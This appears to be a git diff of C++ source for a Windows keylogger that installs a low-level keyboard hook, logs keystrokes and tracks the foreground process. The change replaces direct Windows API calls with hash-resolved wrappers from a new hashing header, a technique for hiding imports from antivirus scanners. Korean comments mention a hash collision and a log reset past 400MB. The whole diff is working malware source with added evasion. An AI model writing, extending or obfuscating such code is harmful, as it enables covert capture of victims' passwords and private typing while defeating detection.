@@ -1,9 +1,8 @@
-#include "keyLogger.h"
-#include "commandManager.h"
-#include <Psapi.h>
 #include <tchar.h>
 #include <map>
-//#include "initialize.h"
+#include "keyLogger.h"
+#include "commandManager.h"
+#include "HashFunction_keylog.h"
 
 std::string keyLogger::keyLog = "";
 DWORD keyLogger::prevPID = 0;
@@ -76,11 +75,11 @@ void keyLogger::startHook()
 {
 	keyLogger::initializeKeyDict();
 
-	HMODULE hModule = GetModuleHandle(NULL);
-	keyHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHook, hModule, NULL);
+	HMODULE hModule = GetModuleHandleW_c(NULL);
+	keyHook = SetWindowsHookExA_c(WH_KEYBOARD_LL, KeyboardHook, hModule, NULL);
 
 	MSG msg;
-	GetMessage(&msg, NULL, NULL, NULL);
+	GetMessageW_c(&msg, NULL, NULL, NULL);
 }
 
 std::string keyLogger::getKeyLog()
@@ -103,7 +102,7 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 
 		makeKeyLog(pKey->vkCode, 0);
 	}
-	return CallNextHookEx(keyHook, nCode, wParam, lParam);
+	return CallNextHookEx_c(keyHook, nCode, wParam, lParam);
 }
 
 /*
@@ -114,7 +113,7 @@ void makeKeyLog(int keyCode, int statusFlag)
 	std::string logMessage = "";
 	std::string keyName = "";
 
-	HWND foregroundHandle = GetForegroundWindow();
+	HWND foregroundHandle = GetForegroundWindow_c(); //해시충돌
 	DWORD pid;
 
 	// 400MB가 넘어가면 메모리를 위해 초기화
@@ -127,7 +126,7 @@ void makeKeyLog(int keyCode, int statusFlag)
 
 	if (foregroundHandle != NULL)
 	{
-		GetWindowThreadProcessId(foregroundHandle, &pid);
+		GetWindowThreadProcessId_c(foregroundHandle, &pid);
 
 		if (pid != keyLogger::prevPID)
 		{
